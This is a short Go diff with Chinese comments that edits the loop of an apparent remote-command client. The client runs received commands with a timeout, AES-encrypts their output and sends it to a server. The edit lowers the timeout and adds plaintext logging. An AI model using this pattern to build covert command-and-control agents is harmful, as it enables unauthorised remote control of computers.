@@ -113,7 +113,7 @@ func main() {
 			baseCtx := context.Background()
 
 			// 设置超时时间为5秒
-			ctx, cancel := context.WithTimeout(baseCtx, 5*time.Second)
+			ctx, cancel := context.WithTimeout(baseCtx, 3*time.Second)
 			defer cancel()
 
 			if len(tokens) == 1 {
@@ -125,11 +125,13 @@ func main() {
 			if err != nil {
 				//报错进行加密
 
-				cmd.Out = err.Error()
+				log.Println("err:", err)
+				// cmd.Out = err.Error()
 
 			}
 			//将结果发送给服务端时先进行加密处理
 			cmd.Out += string(buf)
+			log.Println(cmd.Out)
 			cmd.Out, _ = util.EncryptByAes([]byte(cmd.Out))
 			fmt.Println("收:" + cmd.In + "\n 发出:" + cmd.Out)
 			client.SendOutput(ctx, cmd)
